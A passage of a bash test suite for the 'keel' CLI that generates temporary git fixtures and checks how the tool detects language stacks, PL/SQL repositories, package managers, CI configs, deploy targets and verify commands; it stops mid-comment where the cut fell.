#!/usr/bin/env bash
# Tests for bin/keel. Fixtures are generated per case rather than committed, so they cannot go
# stale against the code they exercise.
#
# Run from the repository root.

# The `condition && report_pass || report_fail` idiom is used throughout. It is safe here, and only
# here, because every reporting helper returns 0 explicitly: see the `return 0` on each below. That
# makes the invariant shellcheck cannot see a stated fact in the code rather than an assumption.
# shellcheck disable=SC2015
# shellcheck disable=SC2016
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
KEEL="$ROOT/bin/keel"
pass=0
fail=0

ok()   { printf '  PASS  %s\n' "$1"; pass=$((pass+1)); return 0; }
bad()  { printf '  FAIL  %s: %s\n' "$1" "$2"; fail=$((fail+1)); return 0; }

# Every stack is built once, committed once, and copied per case. The content and the commit are
# identical every time and no test asserts on commit identity, so the git work is shared as well as
# the files. fixture() hands out a copy and never the template, so nothing a case does can reach it.
FIXTURE_CACHE="$(mktemp -d)"

# A throwaway git repo of the given stack, printed as a path.
fixture() {
    local stack="$1"
    local tmpl="$FIXTURE_CACHE/$stack" dir
    [ -d "$tmpl" ] || fixture_build "$stack" "$tmpl"
    dir="$(mktemp -d)"
    cp -R "$tmpl/." "$dir/"
    printf '%s' "$dir"
}

fixture_build() {   # fixture_build <stack> <dir>
    local stack="$1" dir="$2"
    mkdir -p "$dir"
    ( cd "$dir" || exit 1
      git init -q -b main .
      git config user.email t@t.t; git config user.name t
      case "$stack" in
        node-ts)
          cat > package.json <<'P'
{"name":"f","scripts":{"test":"jest","lint":"eslint .","build":"tsc","typecheck":"tsc --noEmit"},
 "devDependencies":{"typescript":"^5"}}
P
          echo '{}' > tsconfig.json ;;
        go)   printf 'module f\n\ngo 1.22\n' > go.mod ;;
        php)  echo '{"name":"f/f"}' > composer.json ;;
        python) printf '[project]\nname = "f"\n' > pyproject.toml ;;
        csharp)
          mkdir -p src/Api
          printf '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup></Project>\n' \
            > src/Api/Api.csproj ;;
        ruby)
          printf "source 'https://rubygems.org'\ngem 'rails'\ngem 'rspec'\n" > Gemfile
          mkdir -p spec ;;
        kotlin)
          printf 'plugins { kotlin("jvm") version "2.0.0" }\n' > build.gradle.kts
          mkdir -p src/main/kotlin && printf 'fun main() {}\n' > src/main/kotlin/App.kt ;;
        swift)
          printf '// swift-tools-version:5.9\nimport PackageDescription\n' > Package.swift ;;
        cpp)
          printf 'cmake_minimum_required(VERSION 3.20)\nproject(f)\nenable_testing()\n' > CMakeLists.txt ;;
        lua)
          printf '{"runtime":{"version":"LuaJIT"}}\n' > .luarc.json
          printf 'return {}\n' > init.lua ;;
        polyglot)
          cat > package.json <<'P'
{"name":"f","scripts":{"test":"vitest run"},"devDependencies":{"typescript":"^5"}}
P
          echo '{}' > tsconfig.json
          printf '[project]\nname = "f"\n' > pyproject.toml ;;
        plsql)
          # Twelve .sql at the root and one package body below it, so .sql dominates and the
          # Oracle token sits in a subdirectory rather than the first file read.
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id NUMBER);\n' "$i" > "s$i.sql"; i=$((i+1)); done
          mkdir -p src
          printf 'CREATE OR REPLACE PACKAGE BODY pkg AS v VARCHAR2(30); END;\n' > src/pkg.sql
          printf '# notes\n' > README.md ;;
        plsql-small)
          # Nine .sql files in total, one short of the floor, and the ninth carries the Oracle token
          # so the fixture fails on the count alone rather than on two clauses at once.
          i=1; while [ "$i" -le 8 ]; do printf 'SELECT 1 FROM DUAL;\n' > "q$i.sql"; i=$((i+1)); done
          printf 'CREATE OR REPLACE PACKAGE BODY p AS v VARCHAR2(1); END;\n' > pkg.sql ;;
        ts-migrations)
          # The live false positive: .sql present, manifest present, .ts dominant.
          cat > package.json <<'P'
{"name":"f","scripts":{"test":"vitest run"},"devDependencies":{"typescript":"^5"}}
P
          echo '{}' > tsconfig.json
          i=1; while [ "$i" -le 20 ]; do printf 'CREATE TABLE t%s (id int);\n' "$i" > "m$i.sql"; i=$((i+1)); done
          i=1; while [ "$i" -le 40 ]; do printf 'export const x%s = 1\n' "$i" > "f$i.ts"; i=$((i+1)); done ;;
        plsql-nomarker)
          # PostgreSQL shaped: dominant .sql, no manifest, and PL/pgSQL syntax that must not count
          # as Oracle. Clauses 1 to 3 all hold here, so clause 4, the Oracle token, is the only one
          # that can reject it. The %ROWTYPE and %TYPE are the trap: PL/pgSQL has both, so a token
          # set that included them would call this tree Oracle.
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id integer);\n' "$i" > "m$i.sql"; i=$((i+1)); done
          mkdir -p sql
          printf 'DECLARE r mytable%%ROWTYPE; v mytable.col%%TYPE; BEGIN END;\n' > sql/fn.sql ;;
        plsql-pkg)
          # The idiomatic Oracle layout: package specs and bodies outnumber plain .sql. It must
          # still be detected, which is why sql_census leaves .pks, .pkb, .prc and .fnc out of the
          # denominator instead of letting them compete with .sql in the dominance test. Put them
          # back in and this tree censuses as "12 30" and is not Oracle.
          #
          # The Oracle token goes in the .sql files, not the .pkb ones: has_oracle_token scans
          # --include='*.sql' --include='*.plsql' only, so a token living in a .pkb is invisible to
          # it and this fixture would fail the token clause rather than exercising the denominator.
          i=1; while [ "$i" -le 30 ]; do printf 'PACKAGE p;\n' > "p$i.pks"; printf 'PACKAGE BODY p AS END;\n' > "p$i.pkb"; i=$((i+1)); done
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id VARCHAR2(9));\n' "$i" > "s$i.sql"; i=$((i+1)); done ;;
        plsql-notdominant)
          # Twelve .sql against forty .md, with the Oracle token present, so the count clause and
          # the token clause both hold and dominance is the only clause that fails. It is the
          # fixture that pins the dominance comparison itself: with that comparison deleted from
          # is_plsql_tree, this tree is the one that starts being called Oracle.
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id NUMBER);\n' "$i" > "s$i.sql"; i=$((i+1)); done
          printf 'CREATE OR REPLACE PACKAGE BODY p AS v VARCHAR2(9); END;\n' > s1.sql
          i=1; while [ "$i" -le 40 ]; do printf '# doc %s\n' "$i" > "d$i.md"; i=$((i+1)); done ;;
        plsql-upper)
          # SQL Developer and exp emit uppercase names. The census counts these and the token scan
          # must see them too, or the count and the evidence disagree.
          i=1; while [ "$i" -le 13 ]; do printf 'CREATE TABLE t%s (id NUMBER);\n' "$i" > "M$i.SQL"; i=$((i+1)); done
          printf 'CREATE OR REPLACE PACKAGE BODY p AS v VARCHAR2(9); END;\n' > M1.SQL ;;
        plsql-hidden)
          # A dotted name with a real extension is a .sql file. The census used to skip it while the
          # token scan read it, so detection could rest on a file the census denied existed.
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id integer);\n' "$i" > "m$i.sql"; i=$((i+1)); done
          printf 'v VARCHAR2(9);\n' > .oracle.sql ;;
        plsql-dotend)
          # A basename ending in a dot has no extension. It used to land in a shared empty bucket
          # and outvote .sql, which is the same defect the pks exclusion closed from the other side.
          i=1; while [ "$i" -le 12 ]; do printf 'v VARCHAR2(9);\n' > "s$i.sql"; i=$((i+1)); done
          i=1; while [ "$i" -le 40 ]; do : > "f$i."; i=$((i+1)); done ;;
        bare) : ;;
      esac
      git add -A >/dev/null 2>&1; git commit -qm init >/dev/null 2>&1 || true )
}

# The detect-stack functions write_profile itself calls, run inside a fixture without paying for a
# whole `keel init`. Used only where a case asserts on what detection returns; anything asserting on
# a file init writes, on its output, or on doctor keeps the real CLI call.
#
# have_python belongs to bin/keel, not to the library, and pkg_scripts_load returns empty-handed
# without it: every npm script would read as absent and every declared command as a guess. It is
# defined here the same way the pkg_scripts_load probe further down defines it.
detect_in() {   # detect_in <dir> <expression>
    ( cd "$1" && bash -c 'have_python() { command -v python3 >/dev/null 2>&1; }
                          . "$1"
                          eval "$2"' _ "$ROOT/lib/detect-stack.sh" "$2" 2>/dev/null )
}

# Profile fields by dotted path, one per line, rendered as python prints them: None for null, True
# for a boolean. Asking for several at once reads the file in one interpreter start rather than one
# per field.
prof_of() {   # prof_of <dir> <dotted path>...
    local d="$1"; shift
    python3 - "$d/.keel/profile.json" "$@" <<'PY' 2>/dev/null
import json, sys
j = json.load(open(sys.argv[1]))
for path in sys.argv[2:]:
    v = j
    for seg in path.split('.'):
        v = v[seg]
    print(v)
PY
}

# ---- detection -------------------------------------------------------------

for stack in node-ts go php python csharp ruby kotlin swift cpp lua; do
    d="$(fixture "$stack")"
    got="$(detect_in "$d" 'detect_stack | cut -d" " -f1')"
    case "$stack" in
      node-ts) want=typescript ;;
      go)      want=go ;;
      php)     want=php ;;
      python)  want=python ;;
      csharp)  want=csharp ;;
      ruby)    want=ruby ;;
      kotlin)  want=kotlin ;;
      swift)   want=swift ;;
      cpp)     want=cpp ;;
      lua)     want=lua ;;
    esac
    [ "$got" = "$want" ] && ok "detects $stack as $want" || bad "detects $stack" "got '$got', want '$want'"
    rm -rf "$d"
done

# PL/SQL is the first language keel infers rather than reads from a manifest, so each clause of the
# marker gets its own assertion. A single happy-path test would pass with any one of them broken.
for stack in plsql plsql-nomarker plsql-notdominant plsql-pkg plsql-small plsql-upper plsql-hidden plsql-dotend ts-migrations; do
    d="$(fixture "$stack")"
    got="$( cd "$d" && bash -c '. "$1"; detect_languages | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
    case "$stack" in
      plsql)          want="plsql " ;;
      plsql-nomarker)    want="" ;;
      plsql-notdominant) want="" ;;
      plsql-pkg)         want="plsql " ;;
      plsql-small)    want="" ;;
      plsql-upper)       want="plsql " ;;
      plsql-hidden)      want="plsql " ;;
      plsql-dotend)      want="plsql " ;;
      ts-migrations)  want="typescript " ;;
    esac
    [ "$got" = "$want" ] && ok "detect_languages on $stack gives '${want:-nothing}'" \
      || bad "detects $stack" "got '$got', want '${want:-nothing}'"
    rm -rf "$d"
done

# Clause 4 of the marker, and the reason it exists. Each token gets its own case, because a single
# alternation test passes with two of the three patterns wrong.
#
# The %TYPE and %ROWTYPE case is the important one. Both were proposed as Oracle signals and
# rejected: PL/pgSQL supports them, so a detector keying on them mislabels every PostgreSQL
# migrations repository, which is the exact false positive this clause removes.
token_probe() {   # token_probe <file-content>
    local d got
    d="$(mktemp -d)"
    ( cd "$d" || exit 1
      i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id integer);\n' "$i" > "m$i.sql"; i=$((i+1)); done
      printf '%s\n' "$1" > marker.sql )
    got="$( cd "$d" && bash -c '. "$1"; detect_languages | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
    rm -rf "$d"
    printf '%s' "$got"
}

# The fields are separated by | rather than :, because := is PL/SQL's assignment operator and the
# first probe carrying one would split on its own content and assert on something it never wrote.
for probe in 'v VARCHAR2(30);|plsql |VARCHAR2' \
             'DBMS_OUTPUT.PUT_LINE(1);|plsql |DBMS_ prefix' \
             'CREATE OR REPLACE PACKAGE BODY p AS END;|plsql |PACKAGE BODY' \
             'v varchar2(30);|plsql |a lowercase token' \
             'DECLARE r t%ROWTYPE; v t.c%TYPE; BEGIN END;||PL/pgSQL %TYPE and %ROWTYPE' \
             'CREATE TABLE x (id integer);||plain SQL with no Oracle token'; do
    content="${probe%%|*}"; rest="${probe#*|}"; want="${rest%%|*}"; label="${rest#*|}"
    got="$(token_probe "$content")"
    [ "$got" = "$want" ] && ok "$label yields '${want:-nothing}'" \
      || bad "oracle token" "$label gave '$got', want '${want:-nothing}'"
done

# has_oracle_token's fallback used to pipe straight into `xargs -0 grep`. GNU xargs runs its command
# once even on zero input unless given -r, and grep with no file operand then reads the inherited
# stdin: a hang, not a quick "no match", and Linux-only, since BSD xargs does not invoke on empty
# input. This fixture reaches the fallback (an unreadable directory forces the primary grep past
# rc 1) with nothing for the fallback's own find to see, which is the exact shape that triggered it.
# The assertion could not be watched fail on this machine's BSD xargs, only reasoned from GNU's
# documented behaviour; it guards the return value and that the call does not block.
d="$(mktemp -d)"
( cd "$d" || exit 1
  mkdir -p blocked; : > blocked/unreadable
  chmod 000 blocked )
got="$( cd "$d" && bash -c '. "$1"; has_oracle_token; echo "rc=$?"' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
chmod 755 "$d/blocked"
[ "$got" = "rc=1" ] \
  && ok "has_oracle_token returns false rather than blocking with nothing for the fallback to scan" \
  || bad "has_oracle_token empty fallback" "got '$got', want 'rc=1'"
rm -rf "$d"

# NFR-01, NFR-02 and NFR-04, asserted as properties rather than as a clock. A timed test fails on a
# loaded CI runner for reasons unrelated to the code; these three do not.
#
# The census must not run at all on a project that declares itself, FR-04. The stub records itself
# in a file rather than exiting: sql_census is called through census="$(sql_census)", so an exit
# inside it only kills the substitution and the caller carries on, which is why the first version of
# this assertion passed even against a detect_languages that ran the census first. Verified
# 2026-08-18 against exactly that mutant.
d="$(fixture ts-migrations)"
sentinel="$d/census-ran"
got="$( cd "$d" && bash -c 'S="$2"; . "$1"; sql_census() { echo ran >> "$S"; printf "20 40\n"; }; detect_languages | tr "\n" " "' \
        _ "$ROOT/lib/detect-stack.sh" "$sentinel" 2>/dev/null )"
if [ "$got" = "typescript " ] && [ ! -f "$sentinel" ]; then
    ok "a declared project never reaches the census"
else
    bad "census ordering" "detect gave '$got' and the census $([ -f "$sentinel" ] && echo ran || echo did not run); want 'typescript ' and no census"
fi
rm -rf "$d"

# Vendored trees must not sway the count. Without the prune, 40 .js files under node_modules make
# .js the dominant extension and the Oracle repository stops being detected.
d="$(fixture plsql)"
mkdir -p "$d/node_modules/pkg"
i=1; while [ "$i" -le 40 ]; do printf 'x\n' > "$d/node_modules/pkg/f$i.js"; i=$((i+1)); done
got="$( cd "$d" && bash -c '. "$1"; detect_languages | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
[ "$got" = "plsql " ] && ok "node_modules is pruned from the census" \
  || bad "census prune" "got '$got'; vendored files were counted"
rm -rf "$d"

# The same for .git, which on a real repository holds far more files than the working tree.
d="$(fixture plsql)"
got="$( cd "$d" && bash -c '. "$1"; sql_census' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
[ "${got##* }" = "1" ] && ok "the git directory is pruned from the census" \
  || bad "census prune" "largest other extension was '${got##* }', want 1; .git was counted"
rm -rf "$d"

# The APEX marker is keel's own output: lib/apex_render.py writes manifest.json with an apex_version
# key, pinned by tests/test-apex-export.sh. Keying on a file keel writes itself is why this cannot
# false-positive, and the third case is what keeps any other manifest.json from claiming it.
for spec in 'none::an ordinary PL/SQL project' \
            'apex:{"apex_version":"23.2"}:an APEX export tree' \
            'none:{"name":"something-else"}:a manifest.json that is not an APEX export' \
            'none:{"note":"apex_version"}:a manifest.json where apex_version is a value, not a key'; do
    want="${spec%%:*}"; rest="${spec#*:}"; manifest="${rest%:*}"; label="${rest##*:}"
    d="$(fixture plsql)"
    [ -n "$manifest" ] && printf '%s\n' "$manifest" > "$d/manifest.json"
    got="$( cd "$d" && bash -c '. "$1"; lang_profile plsql' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
    [ "$got" = "plsql oracle $want none" ] \
      && ok "$label gives framework $want" \
      || bad "lang_profile plsql" "$label gave '$got', want 'plsql oracle $want none'"
    rm -rf "$d"
done

# The end to end claim, which no other assertion makes: init writes the language into the profile.
# detect_languages returning plsql is not the same thing, and until lang_profile gained its arm the
# profile said unknown on a repository the detector had already classified.
d="$(fixture plsql)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(python3 -c "import json;s=json.load(open('$d/.keel/profile.json'))['stack'];print(s['language'],s['runtime'])" 2>/dev/null)"
[ "$got" = "plsql oracle" ] && ok "keel init writes plsql and oracle into the profile" \
  || bad "init plsql" "profile says '$got', want 'plsql oracle'"
rm -rf "$d"

# detect_datastores greps dependency manifests and returns early when there are none, so it can
# never reach a PL/SQL repository by its existing route. CON-04. This is a separate branch keyed on
# the language, not a ninth pair in the list, and the third case is what proves the existing route
# still works.
d="$(fixture plsql)"
got="$( cd "$d" && bash -c '. "$1"; detect_datastores | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
[ "$got" = "oracle " ] && ok "a PL/SQL project names oracle as its datastore" \
  || bad "datastores" "got '$got', want 'oracle '"
rm -rf "$d"

d="$(fixture ts-migrations)"
got="$( cd "$d" && bash -c '. "$1"; detect_datastores | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
case "$got" in
  *oracle*) bad "datastores" "a TypeScript project with .sql migrations was given oracle" ;;
  *)        ok "a project that is not PL/SQL gains no oracle datastore" ;;
esac
rm -rf "$d"

d="$(fixture python)"
printf 'psycopg2-binary==2.9\n' > "$d/requirements.txt"
got="$( cd "$d" && bash -c '. "$1"; detect_datastores | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
case "$got" in
  *postgres*) ok "the existing manifest-based datastore detection still works" ;;
  *)          bad "datastores" "a psycopg project gave '$got', want postgres" ;;
esac
rm -rf "$d"

# CON-02 and FR-08. utPLSQL runs inside a database and the connection string, schema and credentials
# are nowhere in the repository, so no command can be written. The fixture carries a real utPLSQL
# suite on purpose: it is the case most likely to tempt a future change into guessing one.
d="$(fixture plsql)"
mkdir -p "$d/tests"
printf 'BEGIN ut.run(); END;\n/\n' > "$d/tests/run_all_tests.sql"
got="$(detect_in "$d" 'for k in test test_one lint typecheck build; do detect_verify "$k"; done')"
[ -z "$got" ] && ok "a PL/SQL project gets no invented verify command" \
  || bad "verify" "these commands were invented rather than left null: $got"
rm -rf "$d"

# A Kotlin Gradle build was reported as java/spring: the build.gradle.kts branch was reached before
# anything looked for Kotlin, and the java branch hardcoded spring. Both halves are asserted here
# because fixing one without the other still writes a wrong profile.
d="$(fixture kotlin)"
got="$(detect_in "$d" 'detect_stack | cut -d" " -f3,4')"
[ "$got" = "none gradle" ] && ok "a Kotlin build is not labelled spring" \
  || bad "detects kotlin" "framework and package manager were '$got', want 'none gradle'"
rm -rf "$d"

# A Maven project with no Spring dependency must not be called spring either.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '<project><groupId>f</groupId><artifactId>f</artifactId></project>\n' > pom.xml )
got="$(detect_in "$d" 'detect_stack | cut -d" " -f3')"
[ "$got" = "none" ] && ok "a Maven project with no Spring dependency is framework none" \
  || bad "detects java" "framework '$got', want 'none'"
rm -rf "$d"

# The Kotlin DSL is the default build language for new Gradle builds whatever the project is
# written in, so the file name alone said Kotlin about plain Java projects. They then got
# `./gradlew compileKotlin`, a task that does not exist without the Kotlin plugin, so the typecheck
# gate failed the first time it ran. What the build applies is the marker, not what it is written in.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'plugins { id("java") }\n' > build.gradle.kts
  mkdir -p src/main/java/com/example/app && printf 'class A {}\n' > src/main/java/com/example/app/A.java )
got="$(detect_in "$d" 'detect_stack | cut -d" " -f1')"
[ "$got" = "java" ] && ok "a Java project on the Kotlin DSL is still Java" \
  || bad "detects java" "language '$got', want 'java'"
rm -rf "$d"

# A Gradle build that does apply Kotlin, over a tree that also holds Java sources, is both. The
# depth bound was 4, and the conventional path src/main/java/<group>/<artifact>/A.java is 7, so the
# second language was never found and the mixed repo this branch exists for got one server.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'plugins { id "org.jetbrains.kotlin.jvm" }\n' > build.gradle
  mkdir -p src/main/java/com/example/app && printf 'class A {}\n' > src/main/java/com/example/app/A.java )
got="$(detect_in "$d" 'detect_languages | tr "\n" " "')"
[ "$got" = "kotlin java " ] && ok "a Kotlin build over a Java source tree records both" \
  || bad "detects kotlin" "got '$got', want 'kotlin java '"
rm -rf "$d"

# Verify commands are read from package.json, not guessed.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
[ "$got" = "npm test" ] && ok "reads verify.test from package.json scripts" || bad "verify.test" "got '$got'"
rm -rf "$d"

# A stack with no test script gets null, never a guess.
d="$(fixture go)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.lint)"
[ "$got" = "None" ] && ok "absent command is null, not guessed" || bad "null lint" "got '$got'"
rm -rf "$d"

# One verify command out of a profile, with null read as the empty string so a missing command and
# an empty one compare the same way.
verify_of() {   # verify_of <dir> <key>
    python3 -c "import json;v=json.load(open('$1/.keel/profile.json'))['verify']['$2'];print('' if v is None else v)" 2>/dev/null
}

# ---- javascript package managers and tooling -------------------------------
# Every pnpm, yarn and bun project was told to run npm. The lockfile is the declaration.
for pair in "pnpm-lock.yaml:pnpm" "yarn.lock:yarn" "bun.lockb:bun"; do
    lock="${pair%%:*}"; want="${pair##*:}"
    d="$(fixture node-ts)"
    : > "$d/$lock"
    got="$(detect_in "$d" 'detect_stack | cut -d" " -f4')"
    lint="$(detect_in "$d" 'detect_verify lint')"
    [ "$got" = "$want" ] && ok "$lock means $want" || bad "js pm" "got '$got', want '$want'"
    case "$lint" in "$want"*) ok "$want runs the lint script with $want" ;;
      *) bad "js pm" "lint was '$lint'" ;; esac
    rm -rf "$d"
done

# `bun test` runs bun's own runner and ignores the package script, so bun is the one manager that
# must use `run` even for test. Getting this wrong runs a different test suite than the project's.
d="$(fixture node-ts)"
: > "$d/bun.lockb"
got="$(detect_in "$d" 'detect_verify test')"
[ "$got" = "bun run test" ] && ok "bun runs the declared test script, not its own runner" \
  || bad "js pm" "test was '$got'"
rm -rf "$d"

# ---- more than one lockfile is not a declaration ---------------------------
# Found by running init on a real project carrying both bun.lockb and package-lock.json. bun is
# checked first, so it won, and the profile got four `bun run` commands for a project whose own
# Dockerfile runs `npm ci` and on a machine with no bun installed at all. A precedence rule had
# been presented as a declaration. Two lockfiles mean the project has declared nothing, and the
# whole point of reading the lockfile is to stop guessing.

d="$(fixture node-ts)"
: > "$d/bun.lockb"; : > "$d/package-lock.json"
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"
got="$(python3 -c "import json;v=json.load(open('$d/.keel/profile.json'))['stack']['package_manager'];print('null' if v is None else v)" 2>/dev/null)"
[ "$got" = null ] && ok "two lockfiles leave the package manager undeclared" \
  || bad "js pm" "package_manager was '$got', want null"
pm_leak=0
for k in test test_one lint typecheck build; do
    [ -n "$(verify_of "$d" "$k")" ] && { pm_leak=1; bad "js pm" "verify.$k was '$(verify_of "$d" "$k")' with two lockfiles"; }
done
[ "$pm_leak" -eq 0 ] && ok "and no verify command is guessed from either of them"
case "$out" in *stack.package_manager*) ok "init names the field to set by hand" ;;
  *) bad "js pm" "init printed no note naming stack.package_manager" ;; esac
# The note must not send the reader to --force: --force re-detects, so it would discard the value
# it just asked for and put the commands back to null. Checked here because the first draft did.
case "$out" in *stack.package_manager*--force*) bad "js pm" "the note tells the reader to --force, which discards what they set" ;;
  *) ok "and does not send them to --force, which would discard it" ;; esac
rm -rf "$d"

# ---- what runs the pipeline, and what it ships to --------------------------
# Found by running init on a real project holding a .gitlab-ci.yml and a Dockerfile: deploy.ci and
# deploy.target were written null unconditionally, so every reader had to go and look at files init
# had already walked past. A CI config is a declaration in the way a lockfile is, and it is read the
# same way, ambiguity included.

deploy_of() {   # deploy_of <dir> <key>
    python3 -c "import json;v=json.load(open('$1/.keel/profile.json'))['deploy']['$2'];print('null' if v is None else v)" 2>/dev/null
}

for pair in ".gitlab-ci.yml:gitlab-ci" "Jenkinsfile:jenkins" "azure-pipelines.yml:azure-pipelines" \
            ".circleci/config.yml:circleci" "bitbucket-pipelines.yml:bitbucket-pipelines"; do
    f="${pair%%:*}"; want="${pair##*:}"
    d="$(fixture node-ts)"
    mkdir -p "$d/$(dirname "$f")"; : > "$d/$f"
    got="$(detect_in "$d" detect_ci)"
    [ "$got" = "$want" ] && ok "$f means $want" \
      || bad "deploy ci" "got '$got', want '$want'"
    rm -rf "$d"
done

# A directory of workflows, not a single file, so the marker is the directory having something in it.
d="$(fixture node-ts)"
mkdir -p "$d/.github/workflows"; : > "$d/.github/workflows/ci.yml"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(deploy_of "$d" ci)" = github-actions ] && ok "a workflow under .github/workflows means github-actions" \
  || bad "deploy ci" "got '$(deploy_of "$d" ci)'"
rm -rf "$d"

# An empty .github/workflows is what `git clone` leaves behind after the last workflow is deleted.
d="$(fixture node-ts)"
mkdir -p "$d/.github/workflows"
got="$(detect_in "$d" detect_ci)"
[ -z "$got" ] && ok "an empty .github/workflows declares nothing" \
  || bad "deploy ci" "got '$got' from an empty workflows directory"
rm -rf "$d"

# Same rule as two lockfiles: two pipelines are not two declarations, they are none.
d="$(fixture node-ts)"
: > "$d/.gitlab-ci.yml"; mkdir -p "$d/.github/workflows"; : > "$d/.github/workflows/ci.yml"
got="$(detect_in "$d" detect_ci)"
[ -z "$got" ] && ok "two pipeline configs leave the CI undeclared" \
  || bad "deploy ci" "got '$got' with two CI configs"
rm -rf "$d"

d="$(fixture node-ts)"
got="$(detect_in "$d" detect_ci)"
[ -z "$got" ] && ok "no pipeline config means null, not a guess" \
  || bad "deploy ci" "got '$got' with no CI config at all"
rm -rf "$d"

for pair in "fly.toml:fly" "vercel.json:vercel" "netlify.toml:netlify" "render.yaml:render"; do
    f="${pair%%:*}"; want="${pair##*:}"
    d="$(fixture node-ts)"
    : > "$d/$f"
    got="$(detect_in "$d" detect_deploy_target)"
    [ "$got" = "$want" ] && ok "$f means the target is $want" \
      || bad "deploy target" "got '$got', want '$want'"
    rm -rf "$d"
done

# The one that has to stay null. A Dockerfile says how the thing is packaged, never where it runs:
# the real project this came from has one and ships the image to a VM over ssh. Reading it as a
# target would be the lockfile mistake again, in a field nobody would think to check.
d="$(fixture node-ts)"
printf 'FROM alpine\n' > "$d/Dockerfile"
got="$(detect_in "$d" detect_deploy_target)"
[ -z "$got" ] && ok "a Dockerfile alone is not a deploy target" \
  || bad "deploy target" "a Dockerfile was read as target '$got'"
rm -rf "$d"

# Two platform manifests is a migration halfway done, and the same rule applies.
d="$(fixture node-ts)"
: > "$d/fly.toml"; : > "$d/vercel.json"
got="$(detect_in "$d" detect_deploy_target)"
[ -z "$got" ] && ok "two platform manifests leave the target undeclared" \
  || bad "deploy target" "got '$got' with two platform manifests"
rm -rf "$d"

# A declared typecheck script was detected and then thrown away for `npx tsc --noEmit`, which is a
# different command on any project whose script passes flags or points at a second tsconfig.
d="$(fixture node-ts)"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
[ "$v_typecheck" = "npm run typecheck" ] && ok "a declared typecheck script is the typecheck command" \
  || bad "js tooling" "typecheck was '$v_typecheck'"
rm -rf "$d"

# No script, but a tsconfig: tsc --noEmit is the fallback rather than nothing.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","devDependencies":{"typescript":"^5"}}\n' > package.json
  echo '{}' > tsconfig.json )
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_typecheck" = "npx tsc --noEmit" ] && ok "a tsconfig with no script still typechecks" \
  || bad "js tooling" "typecheck was '$v_typecheck'"
[ -z "$v_test" ] && ok "no test script and no runner declared means no test command" \
  || bad "js tooling" "test was guessed as '$v_test'"
rm -rf "$d"

# Biome and Prettier are declared by their config file, which is how the project says which it uses.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f"}\n' > package.json
  printf '{"linter":{"enabled":true}}\n' > biome.json )
v_lint="$(detect_in "$d" 'detect_verify lint')"
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_lint" = "npx biome check ." ] && ok "a biome.json is the lint command" \
  || bad "js tooling" "lint was '$v_lint'"
[ "$v_format" = "npx biome format ." ] && ok "biome is also the format check" \
  || bad "js tooling" "format was '$v_format'"
rm -rf "$d"

# `ls a* b*` exits non-zero when either operand matches nothing, so testing both Prettier config
# forms in one `ls` was an AND. A repo with the common .prettierrc and no prettier.config.js got
# null, which is the tool being declared and the command still missing.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f"}\n' > package.json
  printf '{"semi":false}\n' > .prettierrc )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = "npx prettier --check ." ] && ok "a .prettierrc alone is the format command" \
  || bad "js tooling" "format was '$v_format'"
[ "$v_format_fix" = "npx prettier --write ." ] && ok "a .prettierrc alone gives the writing variant too" \
  || bad "js tooling" "format_fix was '$v_format_fix'"
rm -rf "$d"

# A newline inside a script value must not lose the script itself. Every caller reads the value as
# a presence test and writes `npm run <name>`, never the body, so skipping the entry answers "there
# is no test command" for a project that declares one.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","scripts":{"test":"echo a\\nfoo","lint":"eslint ."}}\n' > package.json )
v_test="$(detect_in "$d" 'detect_verify test')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ "$v_test" = "npm test" ] \
  && ok "a script value spanning lines still detects the command" \
  || bad "js tooling" "test was '$v_test' on a package.json whose test script contains a newline"
[ "$v_lint" = "npm run lint" ] \
  && ok "a script value spanning lines does not disturb the scripts beside it" \
  || bad "js tooling" "lint was '$v_lint'"
rm -rf "$d"

# PKG_SCRIPTS_LOADED must mean loaded, not attempted. Priming the cache before the file exists and
# marking the load done leaves every later lookup in that process reading an empty cache. Exercised
